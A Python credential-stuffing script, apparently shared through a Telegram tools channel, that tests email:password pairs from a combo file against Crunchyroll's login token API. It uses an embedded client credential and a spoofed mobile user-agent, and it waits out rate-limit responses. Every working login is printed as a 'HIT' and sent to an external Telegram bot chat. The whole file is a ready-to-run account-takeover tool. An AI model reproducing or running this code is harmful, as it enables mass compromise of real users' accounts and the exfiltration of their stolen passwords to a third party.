import requests,random
from concurrent.futures import ThreadPoolExecutor
import concurrent,os,pyfiglet,time
from user_agent import generate_user_agent
import webbrowser
webbrowser.open("https://t.me/pytoolx")

E = '\033[1;31m'
G = '\033[1;35m'
Z = '\033[1;31m'  
X = '\033[1;33m' 
Z1 = '\033[2;31m'
F = '\033[2;32m'
A = '\033[2;34m' 
C = '\033[2;35m'  
B = '\x1b[38;5;208m'  
Y = '\033[1;34m'  
M = '\x1b[1;37m' 
S = '\033[1;33m'
U = '\x1b[1;37m'  

device_id = ''.join(random.choice('0123456789abcdef') for _ in range(32))

print(B)
print(str(pyfiglet.figlet_format(' '*21+"CRUNCHYROLL CHECKER")) + f"{S}                          </>\n")
print(f"{F}━"*77)
tok = input(f' {A} —{Z} BOT {F}TOKEN {X}: ')
os.system('clear')
ID = input(f' {X} —{F} YOUR {Z}ID {A}: ')
os.system('clear')
file_name = input(f' {X} —{F} ENTER FILE PATH:')
file = open(file_name).read().splitlines()


for xx in file:
	if ":" in xx:
		email = xx.split(':')[0]
		pasw = xx.split(':')[1]
		
		url = "https://beta-api.crunchyroll.com/auth/v1/token" 
		
		headers = {
			"host": "beta-api.crunchyroll.com" ,
		   "authorization": "Basic d2piMV90YThta3Y3X2t4aHF6djc6MnlSWlg0Y0psX28yMzRqa2FNaXRTbXNLUVlGaUpQXzU=" ,
		   "x-datadog-sampling-priority": "0",
		   "etp-anonymous-id": "855240b9-9bde-4d67-97bb-9fb69aa006d1", 
		   "content-type": "application/x-www-form-urlencoded",
		   "accept-encoding": "gzip",
		   "user-agent": "Crunchyroll/3.59.0 Android/14 okhttp/4.12.0" 
		}
		
		data = {
		                "username": email,
		                "password": pasw,
		                "grant_type": "password",
		                "scope": "offline_access",
		                "device_id": device_id,
		                "device_name": "SM-G9810",
		                "device_type": "samsung SM-G955N"
		            }
		
		res = requests.post(url,data=data,headers=headers)
		
		
		if "refresh_token" in res.text:
			print(f'{F} HIT ✅  >>>> [ {email} | {pasw} ]')
			requests.post(f'https://api.telegram.org/bot{tok}/sendMessage?chat_id={ID}&text={email}:{pasw}')
		
		elif "406 Not Acceptable" in res.text:
			print( "\n\n" +res.text+"\n\n")
			print(' Wait 5min ❗')
			time.sleep(360)
			
		else:
			print(f'{Z} BAD ❌ >>>> [ {email} | {pasw} ]')
			time.sleep(6)